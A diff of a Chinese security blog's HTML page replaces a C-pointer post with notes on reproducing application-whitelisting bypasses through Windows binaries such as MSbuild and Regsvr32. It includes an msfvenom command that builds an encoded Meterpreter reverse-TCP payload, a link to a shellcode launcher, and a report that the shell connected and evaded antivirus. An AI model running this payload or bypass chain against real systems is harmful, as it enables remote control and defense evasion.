@@ -96,25 +96,31 @@
 
 
 
-  <meta name="description" content="对多级指针一些自己的理解!">
-<meta name="keywords" content="C">
+  <meta name="description" content="多喝热水">
 <meta property="og:type" content="article">
-<meta property="og:title" content="C语言多级指针的理解">
-<meta property="og:url" content="http://8fa94.github.io/2019/03/05/C语言多级指针的理解/index.html">
+<meta property="og:title" content="基于白名单执行PayLoad复现(持续更新~)">
+<meta property="og:url" content="http://8fa94.github.io/2019/03/20/基于白名单执行PayLoad复现-持续更新/index.html">
 <meta property="og:site_name" content="8FA94">
-<meta property="og:description" content="对多级指针一些自己的理解!">
+<meta property="og:description" content="多喝热水">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-05T14:11:04.895Z">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_2.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_3.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_4.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_5.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_6.png">
+<meta property="og:updated_time" content="2019-03-20T14:50:01.823Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="C语言多级指针的理解">
-<meta name="twitter:description" content="对多级指针一些自己的理解!">
+<meta name="twitter:title" content="基于白名单执行PayLoad复现(持续更新~)">
+<meta name="twitter:description" content="多喝热水">
+<meta name="twitter:image" content="http://8fa94.github.io/img/executepayload.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://8fa94.github.io/2019/03/05/C语言多级指针的理解/">
+  <link rel="canonical" href="http://8fa94.github.io/2019/03/20/基于白名单执行PayLoad复现-持续更新/">
 
 
 
@@ -124,7 +130,7 @@
   };
 </script>
 
-  <title>C语言多级指针的理解 | 8FA94</title>
+  <title>基于白名单执行PayLoad复现(持续更新~) | 8FA94</title>
   
 
 
@@ -327,7 +333,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://8fa94.github.io/2019/03/05/C语言多级指针的理解/">
+    <link itemprop="mainEntityOfPage" href="http://8fa94.github.io/2019/03/20/基于白名单执行PayLoad复现-持续更新/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="8Fa94">
@@ -344,7 +350,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">C语言多级指针的理解
+          <h1 class="post-title" itemprop="name headline">基于白名单执行PayLoad复现(持续更新~)
 
               
             
@@ -370,7 +376,7 @@
                 
               
 
-              <time title="Created: 2019-03-05 21:47:32 / Modified: 22:11:04" itemprop="dateCreated datePublished" datetime="2019-03-05T21:47:32+08:00">2019-03-05</time>
+              <time title="Created: 2019-03-20 21:56:02 / Modified: 22:50:01" itemprop="dateCreated datePublished" datetime="2019-03-20T21:56:02+08:00">2019-03-20</time>
             
 
             
@@ -409,13 +415,14 @@
       
 
       
-        <p>对多级指针一些自己的理解!<a id="more"></a></p>
-<h1 id="直接上代码"><a href="#直接上代码" class="headerlink" title="直接上代码"></a>直接上代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">int* p = &amp;a;</span><br><span class="line">int** p2 = &amp;p; </span><br><span class="line">if(p2==&amp;p||*p2==p||**p2==*p)&#123;</span><br><span class="line">    printf(&quot;true&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="第yi行"><a href="#第yi行" class="headerlink" title="第yi行"></a>第yi行</h2><p>int 型的变量a 为一个普通变量 有自己的地址值&amp;a<br>对他取地址就相当于降了一个级别 所以需要一个一级指针接收他的地址 即:int *</p>
-<h2 id="第er行"><a href="#第er行" class="headerlink" title="第er行"></a>第er行</h2><p>int* 型的变量p为一个一级指针变量 有自己的地址值&amp;p<br>因为p为int *类型 对他取地址就相当于降了两个级别 所以&amp;p对应的的接收类型为 int**</p>
-<h2 id="第san行"><a href="#第san行" class="headerlink" title="第san行"></a>第san行</h2><p>此时p2为int **类型 p2==&amp;p *p2==p **p2==*p </p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><del>木有总结,当忘记的时候回来看看大概就想起来了.</del></p>
-
+        <p>多喝热水 <a id="more"></a><br><strong>最近亮神的文章很火,看看文章,做做笔记!</strong></p>
+<h1 id="更新进度"><a href="#更新进度" class="headerlink" title="更新进度"></a>更新进度</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">- [✔] ShellCode执行盒</span><br><span class="line">- [*] MSbuild</span><br><span class="line">- [ ] Installutil</span><br><span class="line">- [ ] Regasm</span><br><span class="line">- [ ] Regsvcs</span><br><span class="line">- [ ] Mshta</span><br><span class="line">- [ ] Compiler</span><br><span class="line">- [ ] Csc</span><br><span class="line">- [ ] Msiexec</span><br><span class="line">- [ ] Regsvr32</span><br><span class="line">- [ ] Wmic</span><br><span class="line">- [ ] Odbcconf</span><br><span class="line">- [ ] PsExec</span><br><span class="line">- [ ] Forfiles</span><br><span class="line">- [ ] Pcalua</span><br><span class="line">- [ ] Msiexec</span><br><span class="line">- [ ] Cmstp</span><br><span class="line">- [ ] Ftp</span><br><span class="line">- [ ] Url.dll</span><br><span class="line">- [ ] zipfldr.dll</span><br></pre></td></tr></table></figure>
+<h1 id="基于ShellCode执行盒的绕过执行Payload"><a href="#基于ShellCode执行盒的绕过执行Payload" class="headerlink" title="基于ShellCode执行盒的绕过执行Payload"></a>基于ShellCode执行盒的绕过执行Payload</h1><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxxx -e x86/shikata_ga_nai -i 5 -f raw &gt; ~/bin</code><br><img src="/img/executepayload.png" alt="executepayload"></p>
+<h2 id="github上开源的ShellCode执行盒"><a href="#github上开源的ShellCode执行盒" class="headerlink" title="github上开源的ShellCode执行盒"></a>github上开源的ShellCode执行盒</h2><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a></p>
+<h2 id="执行payload"><a href="#执行payload" class="headerlink" title="执行payload"></a>执行payload</h2><p><img src="/img/executepayload_2.png" alt="executepayload_2"><br><strong>成功上线!</strong><br><img src="/img/executepayload_3.png" alt="executepayload_3"></p>
+<h2 id="自己也尝试写了一个ShellCode执行盒"><a href="#自己也尝试写了一个ShellCode执行盒" class="headerlink" title="自己也尝试写了一个ShellCode执行盒"></a>自己也尝试写了一个ShellCode执行盒</h2><p><del>(跟着视频写出来的,只改动了一点点</del><br><img src="/img/executepayload_4.png" alt="executepayload_4"><br><img src="/img/executepayload_5.png" alt="executepayload_5"><br><strong>同样成功上线!</strong></p>
+<h2 id="杀毒结果"><a href="#杀毒结果" class="headerlink" title="杀毒结果"></a>杀毒结果</h2><p><img src="/img/executepayload_6.png" alt="executepayload_6"></p>
+<h1 id="基于MSbuild-exe的绕过执行Payload"><a href="#基于MSbuild-exe的绕过执行Payload" class="headerlink" title="基于MSbuild.exe的绕过执行Payload"></a>基于MSbuild.exe的绕过执行Payload</h1>
       
     </div>
 
@@ -436,12 +443,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/C/" rel="tag"># C</a>
-          
-        </div>
-      
 
       
       
@@ -451,8 +452,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/04/SQL-Injection-Attack/" rel="next" title="SQL_Injection_Attack">
-                <i class="fa fa-chevron-left"></i> SQL_Injection_Attack
+              <a href="/2019/03/05/C语言多级指针的理解/" rel="next" title="C语言多级指针的理解">
+                <i class="fa fa-chevron-left"></i> C语言多级指针的理解
               </a>
             
           </div>
@@ -460,10 +461,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/20/基于白名单执行PayLoad复现-持续更新/" rel="prev" title="基于白名单执行PayLoad复现(持续更新~)">
-                基于白名单执行PayLoad复现(持续更新~) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -602,7 +599,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#直接上代码"><span class="nav-number">1.</span> <span class="nav-text">直接上代码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第yi行"><span class="nav-number">1.1.</span> <span class="nav-text">第yi行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第er行"><span class="nav-number">1.2.</span> <span class="nav-text">第er行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第san行"><span class="nav-number">1.3.</span> <span class="nav-text">第san行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#更新进度"><span class="nav-number">1.</span> <span class="nav-text">更新进度</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于ShellCode执行盒的绕过执行Payload"><span class="nav-number">2.</span> <span class="nav-text">基于ShellCode执行盒的绕过执行Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#生成payload"><span class="nav-number">2.1.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github上开源的ShellCode执行盒"><span class="nav-number">2.2.</span> <span class="nav-text">github上开源的ShellCode执行盒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行payload"><span class="nav-number">2.3.</span> <span class="nav-text">执行payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自己也尝试写了一个ShellCode执行盒"><span class="nav-number">2.4.</span> <span class="nav-text">自己也尝试写了一个ShellCode执行盒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杀毒结果"><span class="nav-number">2.5.</span> <span class="nav-text">杀毒结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于MSbuild-exe的绕过执行Payload"><span class="nav-number">3.</span> <span class="nav-text">基于MSbuild.exe的绕过执行Payload</span></a></li></ol></div>
             
 
           </div>
